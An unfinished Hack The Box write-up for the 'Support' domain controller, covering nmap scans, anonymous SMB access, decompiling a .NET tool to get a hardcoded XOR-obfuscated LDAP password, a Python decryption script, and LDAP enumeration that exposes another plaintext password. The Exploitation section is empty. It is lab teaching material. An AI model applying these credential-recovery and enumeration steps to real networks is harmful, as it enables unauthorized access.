---
link:
description:
release date:
tags:
image:
solved:
solve date:
machine no.:
---

<div style="text-align: center; padding: 80px 40px; page-break-after: always;">

  <img src="/ASSETS/writeup_hack_the_box_logo.png" style="width: 1220px; margin-bottom: 60px;" />

  <div><p style="font-size: 40px; font-weight: 600; margin-bottom: 40px;">"Machine Name" Writeup</p></div>

  <img src="badge link" style="width: 400px; margin-bottom: 60px;" />

  <div style="font-size: 18px; line-height: 2.2;">
    <p style="margin: 0;">Prepared by: nedmoeca</p>
    <p style="margin: 0;">Author(s): "htb username"</p>
    <p style="margin: 0;">Difficulty: Easy/Medium/Hard/Insane</p>
    <p style="margin: 0;">Date: DD Month Year</p>
  </div>

</div>
<!-- PAGE BREAK -->

## Attack Chain Summary


<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## 1. Reconnaissance & Discovery
### 1.1 Connect to Hack The Box

First, download your personalized `.ovpn` file from Hack The Box.

Connect to the HTB VPN using the `.ovpn` configuration file. This establishes a secure tunnel that allows access to the target machine’s internal network.

Command: `sudo openvpn your_file.ovpn`

Start the Machine.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 1.2 Verify Target is Reachable

Why this step: Before enumerating, confirm the VPN tunnel actually routes to the target and note any OS fingerprint the response leaks.

**Command:** `ping -c 4 TARGET_IP`

**Breakdown:**

- `ping`
    - **Description:** Sends ICMP echo requests to a host and reports replies and round-trip time.
    - **Purpose:** Confirms the target is live and reachable over the HTB VPN before spending time on port scans.
- `-c 4`
    - **Description:** Count — stop after sending 4 packets.
    - **Purpose:** Bounds the check to a quick, finite sample instead of pinging forever.

**Result:**

```shell
┌──(kali㉿kali)-[~/…/HTB/Machines/Retired/Support]
└─$ ping -c 4 10.129.230.181  
PING 10.129.230.181 (10.129.230.181) 56(84) bytes of data.
64 bytes from 10.129.230.181: icmp_seq=1 ttl=127 time=224 ms
64 bytes from 10.129.230.181: icmp_seq=2 ttl=127 time=224 ms
64 bytes from 10.129.230.181: icmp_seq=3 ttl=127 time=228 ms
64 bytes from 10.129.230.181: icmp_seq=4 ttl=127 time=228 ms

--- 10.129.230.181 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3007ms
rtt min/avg/max/mdev = 224.416/226.332/228.333/1.905 ms
```

**Key finding:** the host is reachable with 0% packet loss, and `ttl=127` indicates a Windows target (initial TTL of 128, decremented by one hop) — this frames every enumeration choice that follows toward Windows/AD services.

**Next:** With reachability and a likely-Windows OS confirmed, map the attack surface by scanning ports and fingerprinting services.

<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## 2. Enumeration

### 2.1 Port Scan with Nmap

Before we can attack a system, we need to find out what "doors" are open. Doors in this context are ports. We use a tool called **Nmap** (Network Mapper) to scan the target's IP address and see what services are running.

#### 2.1.1 Scan All Ports

A quick full-range sweep establishes the complete attack surface before committing time to version detection, so no listening service is missed.

**Command:** `nmap -p- --min-rate 5000 -Pn TARGET_IP`

**Breakdown:**

- `nmap`
    - **Description:** Network mapper — probes hosts for open ports and running services.
    - **Purpose:** Enumerates every reachable TCP port on the target.
- `-p-`
    - **Description:** Scan all 65,535 TCP ports rather than the default top 1,000.
    - **Purpose:** Ensures high ephemeral RPC ports and any non-standard service are captured.
- `--min-rate 5000`
    - **Description:** Send packets at a minimum of 5,000 per second.
    - **Purpose:** Keeps a full-range scan fast enough to be practical against a high-latency VPN target.
- `-Pn`
    - **Description:** Skip host discovery and treat the host as up.
    - **Purpose:** Avoids missing the target if it filters ICMP, and reachability was already confirmed by ping.

**Result:**

```shell
┌──(kali㉿kali)-[~/…/HTB/Machines/Retired/Support]
└─$ nmap -p- --min-rate 5000 -Pn 10.129.230.181 | grapo
Starting Nmap 7.98 ( https://nmap.org ) at 2026-07-22 05:59 +0000
Nmap scan report for 10.129.230.181
Host is up (0.43s latency).
Not shown: 65518 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
49664/tcp open  unknown
49667/tcp open  unknown
49678/tcp open  unknown
49690/tcp open  unknown
49703/tcp open  unknown
49741/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 41.67 seconds

53,88,135,139,389,445,464,593,636,3269,5985,49664,49667,49678,49690,49703,49741
```

**Key finding:** the open-port profile — Kerberos (88), LDAP (389/636/3269), SMB (445), DNS (53), WinRM (5985) — is the classic fingerprint of a Windows Active Directory Domain Controller, with no web service present.

**Next:** Run version and script detection against the named service ports to confirm the domain and identify the host role.
<div align="center">
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
</div>

#### 2.1.2 Run a Targeted Deep Scan

The full sweep found the ports; a scripted version scan on the meaningful service ports is needed to confirm the domain name and DC hostname required for host-file entries and later LDAP/SMB work.

**Command:** `nmap -A -p 53,88,135,139,389,445,464,593,636,3269,5985 TARGET_IP`

**Breakdown:**

- `-A`
    - **Description:** Aggressive scan — enables version detection (`-sV`), default scripts (`-sC`), OS detection, and traceroute in one flag.
    - **Purpose:** Pulls service versions and LDAP/SMB script data that reveal the domain and host role.
- `-p 53,88,135,139,389,445,464,593,636,3269,5985`
    - **Description:** Restrict the scan to this explicit port list.
    - **Purpose:** Targets only the named AD service ports, deliberately excluding the dynamic high RPC ports (49664+) that add scan time without actionable results.

**Result:**

```shell
┌──(kali㉿kali)-[~/…/HTB/Machines/Retired/Support]
└─$ nmap -A -p 53,88,135,139,389,445,464,593,636,3269,5985 10.129.230.181
Starting Nmap 7.98 ( https://nmap.org ) at 2026-07-22 06:04 +0000
Nmap scan report for 10.129.230.181
Host is up (0.23s latency).

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-07-22 06:04:33Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2022|2012|2016 (89%)
OS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016
Aggressive OS guesses: Microsoft Windows Server 2022 (89%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2016 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-07-22T06:04:57
|_  start_date: N/A
|_clock-skew: -19s

TRACEROUTE (using port 445/tcp)
HOP RTT       ADDRESS
1   231.72 ms 10.10.14.1
2   232.39 ms 10.129.230.181

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 79.01 seconds
```

**Key finding:** the domain is `support.htb` and the host role is `DC`, confirming the target is the domain controller `dc.support.htb`; SMB 3.1.1 requires message signing.

<div align="center">
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
</div>

#### 2.1.3 Scan Results Analysis

|Port|Service|Version|Analysis|Simple Explanation|
|---|---|---|---|---|
|53|DNS|Simple DNS Plus|AD-integrated DNS; confirms domain-controller role, can be queried for records.|This machine is the "phone book" for the network — another sign it's a domain controller.|
|88|Kerberos|Microsoft Windows Kerberos|AD authentication; enables Kerberos attacks (later used for the S4U/RBCD ticket request).|The system that hands out login "tickets." We abuse it at the end to become admin.|
|135 / 593|MSRPC / RPC-over-HTTP|Microsoft Windows RPC|Endpoint mapper; supports RPC-based enumeration.|A directory that tells programs where to find Windows services. Mostly plumbing.|
|139 / 445|NetBIOS / SMB|Microsoft-DS|File sharing — primary enumeration target; check for anonymous share access.|Windows file sharing. This is our way in — we look for folders open to anyone.|
|389 / 636 / 3269|LDAP / LDAPS / Global Catalog|AD LDAP|Directory service; leaks `Domain: support.htb`. Queryable for users once bind creds are obtained.|The database of all users and groups. Once we get a password, we can read it.|
|464|kpasswd|—|Kerberos password change service; presence reinforces DC role.|The "change your password" service for Kerberos. Just confirms this is a DC.|
|5985|WinRM|Microsoft HTTPAPI 2.0|Remote management; the intended shell path once valid credentials are recovered.|Remote control for Windows. Once we have a valid login, this gives us a shell.|

**What this gives you:** The surface is a Domain Controller with no web attack surface; SMB is the only service that may permit anonymous access, making it the first enumeration target.

**Next:** Add the discovered domain to `/etc/hosts`, then enumerate SMB shares for anonymous access.

<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 2.2 Add the Domain to the Hosts File

The Nmap LDAP banner revealed the domain `support.htb` and host `dc.support.htb`; name-based tools and the target binary resolve these names rather than the raw IP, so map them locally before proceeding.

**Command:** `echo 'TARGET_IP support.htb dc.support.htb' | sudo tee -a /etc/hosts`

**Breakdown:**

- `tee -a /etc/hosts`
    - **Description:** Writes stdin to a file; `-a` appends rather than overwriting.
    - **Purpose:** Adds the domain-to-IP mapping without clobbering existing entries, run under `sudo` because `/etc/hosts` is root-owned.

**Result:**

```shell
┌──(kali㉿kali)-[~/…/HTB/Machines/Retired/Support]
└─$ echo '10.129.230.181 support.htb dc.support.htb' | sudo tee -a /etc/hosts
[sudo] password for kali: 
10.129.230.181 support.htb dc.support.htb

┌──(kali㉿kali)-[~/…/HTB/Machines/Retired/Support]
└─$ cat /etc/hosts | grep support
10.129.230.181 support.htb dc.support.htb
```

**What this gives you:** Both `support.htb` and `dc.support.htb` now resolve to the target, satisfying the name resolution the LDAP tooling and the later CIFS ticket request depend on.

**Next:** With name resolution in place, enumerate SMB shares for anonymous access.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 2.3 SMB Enumeration
#### 2.3.1 Enumerate SMB Shares Anonymously

The port scan exposed SMB (445) with no web surface; listing shares under a null session tests whether the DC leaks a non-default share reachable without credentials.

**Command:** `smbclient -L \\\\TARGET_IP\\ -N`

**Breakdown:**

- `smbclient`
    - **Description:** Samba command-line client for accessing SMB/CIFS shares.
    - **Purpose:** Interacts with the target's file-sharing service from Linux.
- `-L \\\\TARGET_IP\\`
    - **Description:** List the shares available on the given host.
    - **Purpose:** Enumerates every share name the server advertises to our session.
- `-N`
    - **Description:** No password — attempt a null/anonymous session.
    - **Purpose:** Tests for unauthenticated access, since no credentials are yet known.

**Why four backslashes:** The backslash doubling is shell escaping, not SMB syntax. An SMB (UNC) path is written `\\TARGET_IP\share`. In bash, `\` is the escape character, so each literal backslash must be doubled to survive to the program: the four leading backslashes collapse to two (the UNC host prefix) and each doubled pair before a name collapses to one. Single-quoting the path instead — `smbclient '\\TARGET_IP\support-tools' -N` — disables escaping and is equivalent.

**Shares ending in `$`:** A trailing `$` marks a hidden administrative share that Windows creates automatically and does not advertise in normal browsing. `C$` and `ADMIN$` map to the `C:\` drive and `C:\Windows` and require administrative credentials to access. `IPC$` holds no files — it is the named-pipe endpoint that carries RPC calls and permits the null session that makes this anonymous listing possible. These are default plumbing and are not accessible anonymously; a share with no `$` and no default role (here, `support-tools`) is human-created and therefore the point of interest.

**Result:**

```shell
┌──(kali㉿kali)-[~/…/HTB/Machines/Retired/Support]
└─$ smbclient -L \\\\10.129.230.181\\ -N

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        support-tools   Disk      support staff tools
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.230.181 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

**Key finding:** the DC permits anonymous SMB enumeration and exposes a non-default share, `support-tools`, described as "support staff tools" — the standard shares (`ADMIN$`, `C$`, `IPC$`, `NETLOGON`, `SYSVOL`) are expected noise.

**Next:** Connect to the `support-tools` share anonymously and list its contents to identify anything worth extracting.
<div align="center">
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
</div>

#### 2.3.2 List and Retrieve the Share Contents

The anonymous listing exposed a non-default `support-tools` share; connecting to it and enumerating its files identifies any custom artifact that could contain hardcoded logic or credentials.

**Command:**

```
smbclient \\\\TARGET_IP\\support-tools -N
ls
get UserInfo.exe.zip
```

**Breakdown:**

- `smbclient \\\\TARGET_IP\\support-tools -N`
    - **Description:** Opens an interactive anonymous session to the named share.
    - **Purpose:** Provides a shell into `support-tools` to browse and download files.
- `ls`
    - **Description:** Lists files in the current share directory.
    - **Purpose:** Reveals which files are stock installers versus a custom binary worth investigating.
- `get UserInfo.exe.zip`
    - **Description:** Downloads the named file from the share to the local working directory.
    - **Purpose:** Retrieves the one non-standard artifact for offline analysis.

**Result:**

```shell
┌──(kali㉿kali)-[~/…/HTB/Machines/Retired/Support]
└─$ smbclient \\\\10.129.230.181\\support-tools -N
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Jul 20 17:01:06 2022
  ..                                  D        0  Sat May 28 11:18:25 2022
  7-ZipPortable_21.07.paf.exe         A  2880728  Sat May 28 11:19:19 2022
  npp.8.4.1.portable.x64.zip          A  5439245  Sat May 28 11:19:55 2022
  putty.exe                           A  1273576  Sat May 28 11:20:06 2022
  SysinternalsSuite.zip               A 48102161  Sat May 28 11:19:31 2022
  UserInfo.exe.zip                    A   277499  Wed Jul 20 17:01:07 2022
  windirstat1_1_2_setup.exe           A    79171  Sat May 28 11:20:17 2022
  WiresharkPortable64_3.6.5.paf.exe      A 44398000  Sat May 28 11:19:43 2022

                4026367 blocks of size 4096. 970317 blocks available
smb: \> get UserInfo.exe.zip
getting file \UserInfo.exe.zip of size 277499 as UserInfo.exe.zip (58.6 KiloBytes/sec) (average 58.6 KiloBytes/sec)
smb: \> exit
```

**Key finding:** every file except `UserInfo.exe.zip` is a well-known off-the-shelf utility; the custom, recently-added `UserInfo.exe.zip` is the artifact worth reverse-engineering.

**Next:** Unzip the archive locally and identify the executable's file type to choose an analysis approach.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 2.4 Unzip and Identify the Binary

The custom `UserInfo.exe.zip` was pulled from the share; extracting it and fingerprinting the executable determines whether it can be decompiled to source or must be reverse-engineered at the assembly level.

**Command:**

```
unzip UserInfo.exe.zip
file UserInfo.exe
```

**Breakdown:**

- `unzip UserInfo.exe.zip`
    - **Description:** Extracts the archive contents into the current directory.
    - **Purpose:** Unpacks the executable and its dependency DLLs for analysis.
- `file UserInfo.exe`
    - **Description:** Reports a file's type by inspecting its header, not its extension.
    - **Purpose:** Confirms the binary's format to select the correct analysis tooling.

**Result:**

```shell
┌──(kali㉿kali)-[~/…/HTB/Machines/Retired/Support]
└─$ unzip UserInfo.exe.zip 
Archive:  UserInfo.exe.zip
  inflating: UserInfo.exe            
  inflating: CommandLineParser.dll   
  inflating: Microsoft.Bcl.AsyncInterfaces.dll  
  inflating: Microsoft.Extensions.DependencyInjection.Abstractions.dll  
  inflating: Microsoft.Extensions.DependencyInjection.dll  
  inflating: Microsoft.Extensions.Logging.Abstractions.dll  
  inflating: System.Buffers.dll      
  inflating: System.Memory.dll       
  inflating: System.Numerics.Vectors.dll  
  inflating: System.Runtime.CompilerServices.Unsafe.dll  
  inflating: System.Threading.Tasks.Extensions.dll  
  inflating: UserInfo.exe.config     

┌──(kali㉿kali)-[~/…/HTB/Machines/Retired/Support]
└─$ ls
CommandLineParser.dll                                      System.Buffers.dll                          UserInfo.exe
Microsoft.Bcl.AsyncInterfaces.dll                          System.Memory.dll                           UserInfo.exe.config
Microsoft.Extensions.DependencyInjection.Abstractions.dll  System.Numerics.Vectors.dll                 UserInfo.exe.zip
Microsoft.Extensions.DependencyInjection.dll               System.Runtime.CompilerServices.Unsafe.dll
Microsoft.Extensions.Logging.Abstractions.dll              System.Threading.Tasks.Extensions.dll

┌──(kali㉿kali)-[~/…/HTB/Machines/Retired/Support]
└─$ file UserInfo.exe     
UserInfo.exe: PE32 executable for MS Windows 6.00 (console), Intel i386 Mono/.Net assembly, 3 sections
```

**Key finding:** `UserInfo.exe` is a .NET assembly, which compiles to intermediate language and decompiles back to near-original C# source — its logic, including any hardcoded credentials, can be read directly.

**Next:** Decompile the assembly and inspect its authentication routine to recover how it binds to the LDAP server.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 2.5 Decompile and Analyze the Authentication Logic

**Why this step:** `UserInfo.exe` is a .NET assembly confirmed earlier; decompiling it exposes how the tool authenticates to LDAP, which is the only lead toward valid domain credentials.

**Command:**

```
ilspycmd UserInfo.exe > UserInfo_decompiled.cs
grep -n -A15 'class Protected' UserInfo_decompiled.cs
grep -n -A8 'public LdapQuery' UserInfo_decompiled.cs
```

**Breakdown:**

- `ilspycmd UserInfo.exe`
    - **Description:** Command-line ILSpy decompiler; reconstructs C# source from a .NET assembly.
    - **Purpose:** Converts the binary back into readable source to inspect its logic.
- `> UserInfo_decompiled.cs`
    - **Description:** Redirects decompiled output to a file.
    - **Purpose:** Saves the source for grepping and reference.
- `grep -n -A15 'class Protected'`
    - **Description:** Prints the matching line plus 15 following lines, with line numbers.
    - **Purpose:** Isolates the credential-handling class without reading the whole file.

**The situation.** You have a file, `UserInfo.exe`. It's a program someone on the support team wrote. When a developer writes a program, they write it in **source code** — human-readable text with variable names, functions, and comments. Then they "compile" it, which translates that readable text into a machine-runnable file (the `.exe`). Normally that compilation is a one-way street: the `.exe` is meant to be _run_, not _read_. If you open a typical `.exe` in a text editor you get garbage.

**Why .NET is different.** This program was written in a Microsoft framework called **.NET** (the `file` command told us: "Mono/.NET assembly"). .NET programs don't compile all the way down to raw machine code. They compile to a halfway stage called **intermediate language (IL)**, and — this is the key part — IL keeps a lot of the original structure: the class names, the method names, the logic. That makes .NET programs **decompilable**: you can run the process backward and recover something very close to the original source code. Java has the same property. Programs written in C or C++ generally do _not_ — those really are a one-way street.

**What a decompiler is.** A decompiler is a tool that reads a compiled file and reconstructs readable source code from it. **ILSpy** is a well-known decompiler for .NET. `ilspycmd` is just its command-line version — no graphical window, you run it from the terminal.

**What a `.cs` file is.** `.cs` is the file extension for **C# source code** (pronounced "C-sharp"). C# is the main programming language people use to write .NET programs. So a `.cs` file is a plain text file containing C# — exactly the kind of readable source the original developer wrote. You can open it in any text editor.

**So what did this command do:**

```
ilspycmd UserInfo.exe > UserInfo_decompiled.cs
```

Read it in three parts:

- `ilspycmd UserInfo.exe` — "take this compiled .NET program and decompile it back into C# source code."
- `>` — this is the shell's **redirect** operator. By default the decompiled source would just scroll past on your screen. The `>` says "instead of printing to the screen, capture all that output and write it into a file."
- `UserInfo_decompiled.cs` — the name of the file to write it into. We gave it the `.cs` extension because the content _is_ C# source.

Net effect: we turned an unreadable executable into a readable `.cs` text file sitting in your folder.

**Why we did it.** We can't see what `UserInfo.exe` does just by looking at the binary. But this program clearly _connects to something and logs in_ (it's a "user info" tool on a domain controller). Programs that log in somewhere must contain credentials _somewhere_. By decompiling it to source, we could **read its actual logic** — and that's exactly what paid off: we found the `Protected` class holding an obfuscated password and the `LdapQuery` code showing it logs into LDAP as `support\ldap`. Reading the source is how we discovered credentials the developer thought were safely hidden inside a compiled binary.

The `grep` commands after were just a convenience — instead of reading the whole `.cs` file top to bottom, we jumped straight to the two sections we cared about (`class Protected` and `LdapQuery`).

**`LdapQuery`** — the whole reason this binary is interesting is that it logs into the domain's LDAP server. Any code that logs in somewhere has to, at some point, construct a connection with a username and password. A class or method named `LdapQuery` is the obvious place that connection is built. Grepping it confirmed exactly that: it calls `new DirectoryEntry("LDAP://support.htb", "support\\ldap", password)` — there's the server, the username, and a `password` variable.

> LDAP — **Lightweight Directory Access Protocol**. It's the protocol used to talk to a _directory service_: a centralized database of an organization's users, groups, computers, and their attributes.
> 
> Think of it as the **phone book of a Windows domain**. When a company has hundreds of employees, it needs one place that answers questions like "who is user `jsmith`?", "what groups is she in?", "what's her email, her job title, her manager?" — and, for computers, "is this machine part of the domain?" That central store is the directory. On a Windows network it's called **Active Directory**, and LDAP is the language you use to query it. That's why you saw ports 389 (LDAP) and 636 (LDAPS, the encrypted version) open in your scan — this box is a domain controller, so it _is_ the directory.

**`Protected`** — that grep followed from what `LdapQuery` showed us. The connection line used a `password` variable that came from `Protected.getPassword()`. So the actual secret wasn't in `LdapQuery` at all; it was handed over by a class called `Protected`. Naturally we grepped `Protected` next to see where that password comes from — and that's the class holding the encrypted blob, the key `armando`, and the XOR decryption routine.

The big lesson, and it's a real-world one: **hardcoding a secret in a compiled program does not hide it.** Anyone who can get the file can decompile it and read the secret back out. That's the entire foothold of this box.

**Result:**

```shell
┌──(kali㉿kali)-[~/…/HTB/Machines/Retired/Support]
└─$ ilspycmd UserInfo.exe > UserInfo_decompiled.cs

┌──(kali㉿kali)-[~/…/HTB/Machines/Retired/Support]
└─$ ls UserInfo_decompiled.cs   
UserInfo_decompiled.cs

┌──(kali㉿kali)-[~/…/HTB/Machines/Retired/Support]
└─$ grep -n -A15 'class Protected' UserInfo_decompiled.cs
73:     internal class Protected
74-     {
75-             private static string enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E";
76-
77-             private static byte[] key = Encoding.ASCII.GetBytes("armando");
78-
79-             public static string getPassword()
80-             {
81-                     byte[] array = Convert.FromBase64String(enc_password);
82-                     byte[] array2 = array;
83-                     for (int i = 0; i < array.Length; i++)
84-                     {
85-                             array2[i] = (byte)((uint)(array[i] ^ key[i % key.Length]) ^ 0xDFu);
86-                     }
87-                     return Encoding.Default.GetString(array2);
88-             }

┌──(kali㉿kali)-[~/…/HTB/Machines/Retired/Support]
└─$ grep -n -A8 'public LdapQuery' UserInfo_decompiled.cs
96:             public LdapQuery()
97-             {
98-                     //IL_0018: Unknown result type (might be due to invalid IL or missing references)
99-                     //IL_0022: Expected O, but got Unknown
100-                    //IL_0035: Unknown result type (might be due to invalid IL or missing references)
101-                    //IL_003f: Expected O, but got Unknown
102-                    string password = Protected.getPassword();
103-                    entry = new DirectoryEntry("LDAP://support.htb", "support\\ldap", password);
104-                    entry.AuthenticationType = (AuthenticationTypes)1;
```

**Key finding:** the binary binds to LDAP as `support\ldap` using a password obfuscated with a recoverable XOR scheme — the ciphertext (`enc_password`), the key (`armando`), and the algorithm (XOR with key, then `0xDF`) are all present, so the plaintext can be reproduced offline.

**Next:** Reimplement the decryption in Python to recover the `ldap` bind password.

> **Ciphertext (encryption) is reversible — two-way.** You take plaintext, apply a key and an algorithm, and get ciphertext. Crucially, if you have the key and the algorithm, you can run it _backward_ and recover the exact original plaintext. Encryption exists so that authorized parties _can_ get the data back. That's precisely what we did: the binary carried the ciphertext (`0Nv32...`), the key (`armando`), and the algorithm (XOR with the key, then `0xDF`) — all three — so we just reversed it and out popped `nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz`. No guessing involved.
> 
> **A hash is one-way — you can't reverse it.** A hash function takes input and produces a fixed-length fingerprint (e.g. `5f4dcc3b5aa765d61d8327deb882cf99` for the word `password` in MD5). There is no "decrypt" operation and no key — the math only runs forward. If someone hands you a hash, you _cannot_ mathematically turn it back into the original. The only way to "recover" it is to **guess**: hash millions of candidate passwords yourself and look for one whose fingerprint matches. That's what tools like `john` and `hashcat` do — brute-force and dictionary attacks, not decryption. If the original was long and random, you may never crack it.
> 
> The quick tells:

|                    | Ciphertext (encryption)            | Hash                              |
| ------------------ | ---------------------------------- | --------------------------------- |
| Direction          | Two-way (encrypt ↔ decrypt)        | One-way only                      |
| Needs a key        | Yes                                | No                                |
| Get original back? | Yes, if you have the key           | No — only guess-and-check         |
| Purpose            | Store/transmit secrets recoverably | Verify without storing the secret |
| How you "break" it | Find the key + algorithm           | Crack it (john/hashcat)           |

<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 2.6 Recover the LDAP Password

The decompiled `getPassword()` routine reveals a reversible XOR obfuscation; reimplementing it in Python turns the stored ciphertext into the usable plaintext `ldap` bind password.

**Command:**

```
python3 decrypt.py
```

with `decrypt.py` containing:

```python
import base64
from itertools import cycle

enc_password = base64.b64decode("0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E")
key = b"armando"
key2 = 223  # 0xDF

res = ''
for e, k in zip(enc_password, cycle(key)):
    res += chr(e ^ k ^ key2)
print(res)
```

**Breakdown:**

- `base64.b64decode(...)`
    - **Description:** Decodes the Base64 `enc_password` string into raw bytes.
    - **Purpose:** Reproduces the first step of the binary's `getPassword()`.
- `cycle(key)`
    - **Description:** Repeats the key `armando` indefinitely to pair with each ciphertext byte.
    - **Purpose:** Mirrors the `key[i % key.Length]` indexing so the key wraps across the data.
- `e ^ k ^ key2`
    - **Description:** XORs each byte with the key byte, then with `0xDF` (223).
    - **Purpose:** Applies the exact two XOR operations from the binary to recover plaintext.

**Result:**

```
nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
```

**Key finding:** the `ldap` account's plaintext bind password is `nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz`, giving authenticated read access to the domain's LDAP directory.

**Next:** Use these credentials with `ldapsearch` to bind to the directory and enumerate domain users for anything sensitive.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 2.7 Enumerate Domain Users via LDAP

The recovered `ldap` bind password grants authenticated directory access; querying LDAP enumerates every domain user and, critically, any non-standard attribute (such as `info`) that may leak a secret.

**Command (connectivity test — full dump):**

```
ldapsearch -x -H ldap://support.htb -D 'ldap@support.htb' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "dc=support,dc=htb"
```

**Command (refined — targeted attributes):**

```
ldapsearch -x -H ldap://support.htb -D 'ldap@support.htb' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "dc=support,dc=htb" "(objectClass=user)" sAMAccountName info
```

**Command (refined — grep-filtered):**

```
ldapsearch -x -H ldap://support.htb -D 'ldap@support.htb' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "dc=support,dc=htb" "(objectClass=user)" sAMAccountName info | grep -iE 'sAMAccountName|info:'
```

**Breakdown:**

- `-x`
    - **Description:** Use simple authentication rather than SASL.
    - **Purpose:** Binds with a plain username and password, matching how the binary authenticates.
- `-H ldap://support.htb`
    - **Description:** URI of the LDAP server to contact.
    - **Purpose:** Points the query at the domain controller by hostname.
- `-D 'ldap@support.htb'`
    - **Description:** Bind DN — the account authenticating to the directory.
    - **Purpose:** Logs in as the recovered `ldap` service account.
- `-w '...'`
    - **Description:** Password for the bind DN.
    - **Purpose:** Supplies the XOR-decrypted `ldap` password.
- `-b "dc=support,dc=htb"`
    - **Description:** Search base — the point in the directory tree to start from.
    - **Purpose:** Scopes the search to the entire `support.htb` domain.
- `"(objectClass=user)"`
    - **Description:** Search filter restricting results to user objects.
    - **Purpose:** Excludes computers, containers, and other noise so only accounts are returned.
- `sAMAccountName info`
    - **Description:** Attribute list — return only these fields per object.
    - **Purpose:** Requests just the login name and the free-text `info` field instead of every attribute.

**Why the refined queries:** The first command carries no filter and no attribute list, so it returns every object with all attributes — a large dump that confirms the bind works but is impractical to read. It is used only as a connectivity test. The second query adds `(objectClass=user)` plus an explicit `sAMAccountName info` attribute list to return only accounts and the two fields of interest; the third pipes that through `grep` to collapse the LDIF spacing into a compact, scannable list. The refinements do not change access — they narrow the same authenticated read down to the signal.

**Result:**

```
sAMAccountName: AdministratorsAMAccountName: GuestsAMAccountName: DC$sAMAccountName: krbtgtsAMAccountName: ldapinfo: Ironside47pleasure40WatchfulsAMAccountName: supportsAMAccountName: smith.rosariosAMAccountName: hernandez.stanley... (18 domain users total) ...
```

_What this gives you:_ **Key finding:** the `support` user object carries a non-default `info` attribute containing `Ironside47pleasure40Watchful` — a plaintext password stored in a notes field — providing candidate credentials for the `support` account.

_Next:_ The `support` account is a member of Remote Management Users, so authenticate over WinRM with these credentials to obtain an interactive foothold.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## 3. Exploitation
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
